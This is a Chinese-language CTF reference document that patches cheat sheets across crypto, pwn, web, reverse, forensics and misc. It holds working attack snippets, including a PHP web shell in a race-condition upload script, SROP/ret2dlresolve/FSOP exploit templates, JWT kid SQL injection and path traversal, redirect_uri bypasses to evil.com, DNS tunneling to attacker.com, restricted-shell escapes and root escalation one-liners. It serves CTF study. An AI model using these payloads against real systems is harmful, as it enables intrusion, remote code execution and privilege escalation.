# CTF Skills 查漏补缺 V4（2026-05-13 审查）

> 基于与原始仓库 Layer 2（14+ 子文档/类别）的交叉对比，识别并补全简化版文档的关键缺口。
> 本文件按类别组织，标注了每个补丁对应的原文档和缺失内容。

---

## 审查概要

| 类别 | 主文档 | 已扩充行数 | 本轮新增 | 原仓库子文档数 |
|------|--------|-----------|---------|---------------|
| Web | ctf-web.md | 725 | +2节 | 15 |
| Pwn | ctf-pwn.md | 420 | +8节 | 11 |
| Crypto | ctf-crypto.md | 487 | +6节 | 13 |
| Reverse | ctf-reverse.md | 524 | +4节 | 12 |
| Forensics | ctf-forensics.md | 687 | +4节 | 12 |
| Misc | ctf-misc.md | 563 | +4节 | 10 |
| OSINT | ctf-osint.md | 523 | 已完整 | 5 |
| AI/ML | ctf-aiml.md | 480 | 已完整 | 3 |
| Malware | ctf-malware.md | 541 | 已完整 | 4 |

---

## 🔐 Crypto — 重大补充

### 补丁目标: ctf-crypto.md (487行 → 预计+300行)

---

### 10) Paillier / Goldwasser-Micali 同态加密

#### Paillier 加法同态
```python
# Paillier: E(m) = g^m * r^n mod n^2
# 加法同态: E(m1) * E(m2) = E(m1+m2) mod n^2
# 标量乘: E(m)^k = E(k*m) mod n^2

# CTF 场景: 服务器提供加密oracle，要求解密某个被ban的值
# 绕过: 加密 (ban_value / 2)，然后乘以 E(2)

from Crypto.Util.number import *
def paillier_decrypt_oracle_bypass(c_ban, n, oracle):
    """oracle(c) 返回解密值 (不包含ban_value的c)"""
    r = 2
    c_bypass = (c_ban * pow(r, n, n**2)) % (n**2)
    m_bypass = oracle(c_bypass)
    m = (m_bypass * inverse(r, n)) % n
    return long_to_bytes(m)
```

#### Goldwasser-Micali (GM)
```python
# GM 加密单个位: E(0)=r^2 mod n, E(1)=y*r^2 mod n
# y是二次非剩余 (Jacobi符号=1但Legendre=-1)

# 重放攻击: 重复提交同一个密文作为key
# oracle会区分全-0和全-1 key
# 特点: 额外信息泄露 — ciphertext re-use patterns
```

---

### 11) ZKP 攻击 (Groth16 / SNARG)

#### Groth16 Broken Setup (delta == gamma)
```python
# 验证方程: e(A,B) = e(alpha,beta) * e(C,delta) * e(inputs,gamma)
# 如果 delta == gamma:
#   A = alpha, B = beta, C = -vk_x  
#   → 任意输入都通过验证!
# 动手检查: compare vk.delta == vk.gamma first
```

#### DV-SNARG Forgery
```python
# 如果有验证oracle:
# 1. 提交pairs that unconstrain v values
# 2. 从接受/拒绝中恢复v值 (bit by bit)
# 3. 构造CRS entry cancellation → 伪造任意proof
```

#### Shamir SSS 复用系数
```python
# 当同一随机多项式系数用于每个秘密字节:
# share1 = s[0] + a1*r1 + a2*r2 + ... + an*rn
# share2 = s[1] + a1*r1 + a2*r2 + ... + an*rn
# → share1 - share2 = s[0] - s[1]  # 随机项抵消!
# 只需要2个share即可恢复所有字节差异
```

#### Garbled Circuits Free-XOR
```python
# 如果使用 Free-XOR 优化 (全局offset):
# 观察: 3个加密truth table entries → XOR得到global delta
# 恢复delta后 → 可解密所有gates!
```

---

### 12) DSA 攻击

#### DSA Nonce 重用 (与ECDSA同理)
```python
# DSA参数: p(大素数), q(p-1的素因子), g(生成元)
# 签名: r=(g^k mod p) mod q, s=k^(-1)*(H(m)+x*r) mod q
# 两个签名中r相同 → k相同:
def dsa_nonce_reuse(r, s1, s2, h1, h2, q):
    k = ((h1 - h2) * pow(s1 - s2, -1, q)) % q
    x = ((s1 * k - h1) * pow(r, -1, q)) % q
    return x  # 私钥!
```

#### DSA 小k爆破
```python
# 如果k只有20位 → 直接爆破!
for k in range(1, 2**20):
    r_check = pow(g, k, p) % q
    if r_check == r:
        print(f"Found k={k}")
        break
```

#### DSA MD5 Collision on k-generation
```python
# k = MD5(prefix + counter) → 用fastcoll生成碰撞
# 两个不同prefix → 相同MD5 → 相同k → 恢复私钥
# 工具: fastcoll, hashclash
```

---

### 13) 异类密码结构

#### Braid Group DH (Alexander多项式)
```
// 辫群 Diffie-Hellman
// 关键弱点: Alexander多项式是乘性的!
// A(b1 * b2) = A(b1) * A(b2)
// Eve: shared_key_poly = A(pub_a) * A(pub_b) → 恢复共享密钥
```

#### Tropical Semiring (Min-Plus) 破解
```python
# DH: shared = A ⊗ B (min-plus 矩阵乘法)
# 攻击: residual b* = max(Mb[j] - M[i][j])
# 直接从公钥矩阵恢复共享密钥 - O(n^2)
```

#### BB-84 QKD MITM
```
// BB-84 量子密钥分发 (模拟环境)
// 如果不行认证的经典信道:
//   → 完全MITM可行!
// Eve: 独立与Alice和Bob协商密钥
// → 强制一方输出固定值 → 控制通信
```

#### FPE Feistel Brute-Force
```python
# Format-Preserving Encryption with 16-bit round key
# 暴力枚举 2^16 = 65536 种可能
# 用已知明文-密文对验证
# 剩余 affine GF(2) 混合层 → 高斯消元
```

#### Paillier Cryptosystem
```python
# n = p*q, lambda = lcm(p-1, q-1), g = n+1
# 加密: c = g^m * r^n mod n^2
# 解密: m = L(c^lambda mod n^2) * L(g^lambda mod n^2)^(-1) mod n
# L(x) = (x-1)/n
```

#### Icosahedral Symmetry Cipher
```python
# 正十二面体 → 120阶对称群
# 通过API探测所有面排列 → 构建查找表
# 观察可见面模式 → 匹配 → 恢复状态
```

---

### 14) LWE/Module-LWE/Ring-LWE

#### LWE CVP 求解模板
```python
from fpylll import IntegerMatrix, LLL, CVP

def solve_lwe(A, b, q, n):
    """A是m×n矩阵, b=As+e mod q, 恢复小向量s"""
    m = len(b)
    # 构造格基: [q*I | 0; A^T | I]
    M = IntegerMatrix(m+n, m+n)
    for i in range(m):
        M[i, i] = q
    for i in range(n):
        M[m+i, m+i] = 1
    for i in range(m):
        for j in range(n):
            M[i, m+j] = int(A[i][j])
    # 目标向量: [b_0, ..., b_{m-1}, 0, ..., 0]
    target = [int(x) for x in b] + [0]*n
    LLL.reduction(M)
    closest = CVP.closest_vector(M, target)
    return [int(x) for x in closest[m:]]

# 注意: s通常限制为 {-1,0,1} (三元) 或小值
```

#### Orthogonal Lattices
```python
# 隐藏子集/子空间问题
# 需要先恢复正交格，再重建真正的基
# 关键: 从补空间中恢复二元/短基
```

---

### 15) Manger Oracle (RSA-OAEP 计时攻击)

```python
# Python or 短路求值:
# if Y != 0 and expensive_PBKDF2(X): ...
# Y=0 → fast; Y≠0 → slow → 计时泄露!

import time

def calibrate_threshold(oracle_func, n_measurements=50):
    """校准快/慢的阈值"""
    fast_times = [measure_response(fast_payload) for _ in range(n_measurements)]
    slow_times = [measure_response(slow_payload) for _ in range(n_measurements)]
    return (mean(fast_times) + mean(slow_times)) / 2

def manger_phase1(c, n, oracle):
    """Phase 1: 二分找 f = 2^8 * B / n"""
    # ...详见原始文档
    pass

# 完整攻击: ~1024次查询 for 1024-bit RSA
# 每个查询 → 计时 → 泄露1位
```

---

### 16) RSA-CRT Fault Attack (Bellcore)

```python
from math import gcd

def bellcore_attack(n, e, m, correct_sig, faulty_sig):
    """如果CRT签名中s_p计算错误 → 分解n!"""
    # s = CRT(s_p, s_q)
    # 如果s_p出错: s_faulty 模p正确，模q错误
    # gcd(s_faulty^e - m, n) = p
    p = gcd(pow(faulty_sig, e, n) - m, n)
    if 1 < p < n:
        q = n // p
        return p, q
    # 同样尝试 gcd(s_faulty^e - m, n) = q
    return None
```

---

## 🐚 Pwn — 重大补充

### 补丁目标: ctf-pwn.md (420行 → 预计+350行)

---

### 5) SROP (Sigreturn-Oriented Programming)

```python
from pwn import *
context.arch = 'amd64'

# 构造 SigreturnFrame → 任意寄存器控制!
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b'A' * offset + p64(syscall_ret) + bytes(frame)

# ORW frame (绕过 seccomp):
frame.rax = constants.SYS_open   # open("/flag", 0)
frame.rdi = flag_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr_libc
```

---

### 6) Windows Pwn (PE-based)

#### SEH Overwrite (32位)
```python
# 栈溢出覆盖 Structured Exception Handler
# SEH 链: fs:[0] → 下一处理函数
# 利用: 覆盖handler → 触发异常 → EIP控制
# 关键 gadget: POP+POP+POP+RET (PE中很常见)
```

#### Windows CFG Bypass
```python
# CFG (Control Flow Guard): 验证间接调用目标
# 绕过: system() 在 kernel32.dll 中是CFG合法目标
# ROP: setup rcx → "cmd /c TYPE C:\\flag.txt" → call system
```

#### Windows Shellcode
```python
# WinExec("cmd /c ...", SW_SHOW) 是最简单的方式
# 或 CreateProcessA → 更灵活
# 关键地址: kernel32!WinExec / kernel32!CreateProcessA
```

---

### 7) House of 系列堆攻击

| House | 利用条件 | 核心原理 |
|-------|---------|---------|
| **Apple 2** | 修改 _IO_list_all | IO_FILE vtable劫持 → FSOP |
| **Apple 2 + setcontext** | setcontext gadget可用 | SIGRETURN替代方案 |
| **Einherjar** | prev_size可控 | chunk合并偏移攻击 |
| **Orange** | TOP chunk限制 | unsorted bin attack + FSOP |
| **Spirit** | 可控fake fastbin chunk | 伪造chunk释放 |
| **Force** | 可控TOP chunk size | 任意地址分配 |
| **Lore** | 可控small bin | small bin corrupt |

#### FSOP (File Stream Oriented Programming)
```python
# glibc 2.24+: vtable 限制在合法范围
# 滥用: _IO_str_overflow / _IO_wstr_overflow (在合法vtable内!)

from pwn import *
fake_file = FileStructure()
fake_file.flags = u64(b'/bin/sh\x00')  # 注意: flags域被滥用
fake_file._IO_write_ptr = 1
fake_file.vtable = libc.symbols['_IO_str_jumps']
# _IO_str_overflow → 调用 fake_file + 0xE0 → 控制RIP
```

---

### 8) ret2dlresolve

```python
# 原理: 劫持 _dl_runtime_resolve 流程
# 需要: No RELRO (got.plt 可写)

from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)  # 写伪造的reloc/sym/str表
rop.ret2dlresolve(dlresolve)      # 触发解析 → 调用 system("/bin/sh")

# 手动伪造:
# 1. Elf32_Rel: r_offset=GOT项, r_info=(sym_idx<<8)|R_386_JMP_SLOT
# 2. Elf32_Sym: st_name指向"system\0"
# 3. 调用PLT[0] + reloc_offset
```

---

### 9) Blind / Timing Side-Channel

```python
# 逐字节爆破 (crash/no-crash oracle):
def byte_by_byte_leak(oracle_func, flag_len=32):
    known = b''
    for pos in range(flag_len):
        for guess in range(32, 127):
            test = known + bytes([guess])
            padded = test.ljust(flag_len, b'A')
            if not oracle_func(padded):  # 不crash → 猜测正确
                known += bytes([guess])
                break
    return known

# 通过fork服务器的canary爆破:
# 每个进程独立 → canary不变 → 逐字节爆破最多256*8=2048次
```

---

### 10) Kernel Exploitation 进阶

#### SLUB Allocator 绕过
```python
# CONFIG_SLAB_FREELIST_HARDENED:
# freelist_ptr = ptr ^ (swab(ptr_addr) ^ random)
# 需要先 leak random → 再用info leak获取
```

#### KASLR Bypass
```bash
# __ksymtab → 内部固定偏移关系
# /proc/kallsyms → 需要 root (kptr_restrict=0)
# dmesg → 如果 dmesg_restrict=0 → 可能泄露
```

#### modprobe_path 覆写
```python
# 内核执行 /sbin/modprobe 来处理未知文件格式
# 覆盖 modprobe_path → 复制 /flag
strcpy(modprobe_path, "/tmp/pwn.sh")
# 写入: echo -e '#!/bin/sh\ncp /flag /tmp/f' > /tmp/pwn.sh
# chmod +x /tmp/pwn.sh
# 触发未知格式文件执行 → /tmp/pwn.sh 以 root 运行
```

---

### 11) Race Condition 专项

```python
# 文件上传竞态: 上传+访问并发
import threading

def race_upload_access(url, upload_path, shell_path):
    found = threading.Event()
    def upload():
        while not found.is_set():
            requests.post(url + upload_path, 
                files={'file': ('x.php', b'<?php system($_GET["c"]);?>')})
    def access():
        while not found.is_set():
            r = requests.get(url + shell_path + '?c=cat /flag')
            if 'flag{' in r.text:
                print(f"FLAG: {r.text}")
                found.set()
    [threading.Thread(target=upload).start() for _ in range(10)]
    [threading.Thread(target=access).start() for _ in range(10)]

# TCP竞态: 多个连接同时发送请求
# 利用认证前的时间窗口
```

---

## 🌐 Web — 补充

### 补丁目标: ctf-web.md (725行 → 预计+150行)

---

### Web3 / Blockchain 安全

#### 智能合约经典漏洞
```solidity
// 1. 重入攻击 (Reentrancy)
contract Vulnerable {
    mapping(address => uint) balances;
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent);
        balances[msg.sender] = 0; // ❌ 先转账后清零!
    }
}
// 攻击: fallback函数再次调用withdraw → 递归提款
// 修复: 先清零再转账，或使用 ReentrancyGuard

// 2. 整数溢出 (Solidity < 0.8.0)
// 3. tx.origin 钓鱼: tx.origin != msg.sender
// 4. 闪电贷攻击: 借→操纵→套利→还 (一个交易内)
```

#### Web3 工具
```bash
# foundry cast (最常用):
cast call 0xCONTRACT "function()" --rpc-url http://target:8545
cast send 0xCONTRACT "function()" --private-key 0xKEY --rpc-url URL

# slither (静态分析):
slither contract.sol --print human-summary

# echidna (模糊测试):
echidna contract.sol --contract TestContract
```

---

### OAuth 2.0 / SAML / JWT 进阶

#### OAuth 攻击面
```
1. redirect_uri 绕过:
   https://target/callback@evil.com
   https://target/callback.evil.com
   https://evil.com/target/callback (路径遍历)

2. state 参数缺失 → CSRF
3. scope 升级: scope=read → read+write
4. 授权码拦截 (PKCE缺失时)
```

#### SAML 攻击
```xml
<!-- 1. XML签名包装 (Signature Wrapping) -->
<!-- 2. 注释截断注入 -->
<!-- 3. 签名验证绕过: 验证第一个, 取最后一个 -->
<!-- 工具: SAML Raider (Burp插件) -->
```

#### JWT 进阶
```python
# alg:HS256 + 公钥泄露
import jwt
token = jwt.encode({"user": "admin"}, public_key_pem, algorithm='HS256')

# jku/jwk 头注入 → 指向自建JWKS
# kid 路径遍历: {"kid": "../../../../../dev/null"}
# kid SQL注入: {"kid": "x' UNION SELECT 'secret'--"}
```

---

## 🔄 Reverse — 补充

### 补丁目标: ctf-reverse.md (524行 → 预计+150行)

---

### Custom VM 分析技术

```
VMProtect/Themida 特征:
- 大量 PUSH/POP 模拟栈操作
- VM handler 表 → 每条VM指令一个handler
- 变形代码: 等价但不同指令序列

分析方法:
1. 追踪VM入口 → 记录所有handler地址
2. x64dbg脚本 dump 每条handler的输入/输出
3. 分类handler: 算术/内存/控制流
4. 构建指令集映射表 → 写lifting脚本

工具: Triton (动态符号执行), Miasm (IR提升)
```

#### Game Engine RE
```bash
# Unity IL2CPP: C# → IL → C++ 原生代码
# Il2CppDumper: 恢复类名/方法名/字段偏移
Il2CppDumper.exe libil2cpp.so global-metadata.dat output/

# Unreal Engine: UObject 体系
# GObjects → UObject数组 → FName Pool → 字符串查找
# UE4SS / UnrealContainers 分析
```

#### macOS/iOS RE
```bash
# Mach-O:
lipo -info binary           # Fat binary检测
class-dump binary            # ObjC类提取
jtool --sig app.ipa          # 签名检查

# iOS: Frida 注入 (无需重签名)
frida -U -f com.target.app -l hook.js
```

#### MBA (Mixed Boolean-Arithmetic) 识别
```python
# MBA: 用布尔运算隐藏算术
# x + y → (x ^ y) + 2*(x & y)
# x - y → (x ^ ~y) + 2*(x & ~y) + 1

# 工具: msynth (GitHub: mrphrazer/msynth)
# Triton AST simplification
# Miasm symbolic execution + simplification pass
```

---

## 🔬 Forensics — 补充

### 补丁目标: ctf-forensics.md (687行 → 预计+200行)

---

### Windows Forensics 详细

#### Event Logs 关键ID速查
```
4624: 成功登录    4625: 登录失败
4672: 特权分配    4688: 进程创建 (需启用)
4698: 计划任务    7045: 服务安装
1102: 日志清除    4720: 用户创建
1149: RDP认证成功 (含源IP!)
```

#### $MFT / Prefetch / Amcache
```bash
# $MFT: NTFS主文件表 → MFTECmd 解析
# Prefetch: C:\Windows\Prefetch\*.pf → PECmd 解析
#   → 执行次数、最后执行时间、加载的DLL
# Amcache: 程序SHA1 + 路径 + 首次安装时间
# USN Journal: 所有文件操作的时间线 (日志清除后仍保留!)
```

#### 回收站
```
Win10: C:\$Recycle.Bin\<SID>\
  $RXXXXXX → 文件内容
  $IXXXXXX → 删除时间 + 原始路径 (UTF-16LE)
```

---

### Linux Forensics
```bash
# 攻击链检查清单:
last -20; lastb -20               # 登录记录
ps auxf                            # 进程树
netstat -antp; ss -tuln           # 网络连接
crontab -l; ls /etc/cron.*        # 定时任务
find / -perm -4000 2>/dev/null     # SUID
find / -mtime -1 -type f 2>/dev/null  # 最近修改
ausearch -m ALL -ts recent         # 审计日志

# Docker取证:
docker history --no-trunc image    # 构建历史 (泄露秘密!)
docker export container -o c.tar   # 导出文件系统
docker save image -o i.tar         # 层分析
```

---

### 3D Printing / Keyboard Acoustic

```python
# G-code 分析 → 侧投影可视化:
# XZ投影 → 侧面文字, YZ投影 → 另一视角
# 只画E>0的移动 → 显示打印内容

# 键盘声学侧信道:
# MFCC特征提取 → KNN分类 → 恢复击键
# CTF中: 已知训练样本 → 分类未知击键
```

---

## 🎲 Misc — 补充

### 补丁目标: ctf-misc.md (563行 → 预计+200行)

---

### Bash Jail / Restricted Shell

```bash
# HISTFILE trick:
HISTFILE=/flag bash; history 2>/dev/null

# verbose mode:
bash -v /flag 2>&1

# 纯bash builtin读取:
while IFS= read -r line; do echo "$line"; done < /flag

# ctypes.sh (直接C库调用):
dlcall -n fd -r int open /flag 0
dlcall -n bytes -r int read $fd $buf 100
dlcall printf "%s" $buf

# rvim jail:
:python3 import os; os.system("cat /flag")
:lua os.execute("cat /flag")

# $()命令替换 + 无完整命令:
x=$(</flag); echo $x
a=c;b=at;c=/flag;$a$b $c
```

---

### RF / SDR 实践

```python
# IQ格式处理:
import numpy as np

# cf32 (complex float 32):
signal = np.fromfile('capture.cf32', dtype=np.complex64)

# cs16 (complex int16):
raw = np.fromfile('capture.cs16', dtype=np.int16)
signal = raw[::2] + 1j * raw[1::2]

# cu8 (RTL-SDR raw):
raw = np.fromfile('capture.cu8', dtype=np.uint8)
signal = (raw[::2]-127.5) + 1j*(raw[1::2]-127.5)

# QAM-16 解调: 最近星座点 → Gray解码 → 拼字节
# Costas Loop: 载波恢复 (纠正频率偏移)
# Gardner TED: 定时同步 (纠正采样偏移)

# 问题速查:
# 圆星座 → 频率偏移 → Costas Loop
# 螺旋星座 → 频率漂移 → PLL
# 散点 → 噪声/未同步 → 调整增益+同步
```

---

### DNS Exploitation

```bash
# NSEC Walking (DNSSEC区域枚举):
dig @ns1.target target.com NSEC
# 链式遍历 → 下一个域名 → 继续查询 → 完整列表

# ECS Spoofing (EDNS Client Subnet):
dig @dns.target flag.example.com TXT +subnet=10.13.37.1/24

# DNS Tunneling: 数据在子域名中外传
# base32/base64 编码 → .attacker.com
# 响应在TXT记录/size字段

# DNS Rebinding: TTL=0 → 绕过同源策略
# 第一次: 合法IP, 第二次: 127.0.0.1
```

---

### Linux Privilege Escalation

```bash
# SUID查找 + GTFOBins:
find / -perm -4000 -type f 2>/dev/null
# bash -p, find -exec, vim -c, cp (覆盖passwd)

# Sudo Wildcard Injection:
# 规则: user ALL=(root) NOPASSWD: /usr/bin/zip /tmp/backup.zip *
# 利用: touch -- '-T' '--unzip-command=sh -c "id"'
#       sudo /usr/bin/zip /tmp/backup.zip *

# Capabilities:
getcap -r / 2>/dev/null
# cap_setuid+ep → python3 -c 'import os;os.setuid(0);os.system("sh")'
# cap_dac_read_search → 读任意文件

# Docker组 = root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# PostgreSQL RCE:
COPY (SELECT '') TO PROGRAM 'cat /flag > /tmp/out'
```

---

## 📋 检查清单

| 补丁 | 目标文档 | 关键新增 | 预计增量 |
|------|---------|---------|----------|
| Crypto §10-16 | ctf-crypto.md | Paillier/GM, ZKP进阶, DSA, 异类密码, LWE/CVP, Manger, Bellcore | +300行 |
| Pwn §5-11 | ctf-pwn.md | SROP, Windows, House/FSOP, ret2dlresolve, Blind, Kernel进阶, Race | +350行 |
| Web §Web3/Auth | ctf-web.md | Web3/Blockchain, OAuth/SAML/JWT进阶 | +150行 |
| Reverse §VM+ | ctf-reverse.md | Custom VM, Game Engine, macOS/iOS, MBA | +150行 |
| Forensics §Win/Linux | ctf-forensics.md | Windows详细, Linux, Docker, 3D打印, 键盘声学 | +200行 |
| Misc §Bash/RF/DNS/Privesc | ctf-misc.md | Bash Jail, RF/SDR, DNS Expoit, Linux提权 | +200行 |
| **总计** | 6个文档 | 28个专题 | **~1,350行** |

---

*审查日期: 2026-05-13 | 原始仓库 Layer 2: 14+子文档/类别 × 9类别*
*补充制作: 基于原始子文档 SKILL.md 交叉对比 + 实战经验*
